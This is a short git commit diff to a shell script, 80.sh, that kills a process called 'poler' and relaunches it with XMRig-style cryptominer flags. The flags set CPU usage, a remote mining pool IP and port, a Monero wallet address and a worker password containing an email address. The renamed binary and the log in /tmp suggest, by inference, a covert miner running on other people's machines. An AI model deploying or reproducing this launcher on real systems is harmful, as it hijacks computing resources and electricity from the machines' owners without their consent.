66a0d65a8566bf8dd5ac5b5be35d6a79448a2300
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-07-08 22:46:59 +0300

    Update 80.sh

--- 80.sh
+++ 80.sh
@@ -1,4 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 4 -o 185.251.38.11:6007 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=b1-pilot:robbertopp1@gmail.com -k
-
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 82 --cpu-priority 8 -o 94.103.88.27:5997 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=worker1:robbertopp1@gmail.com -k
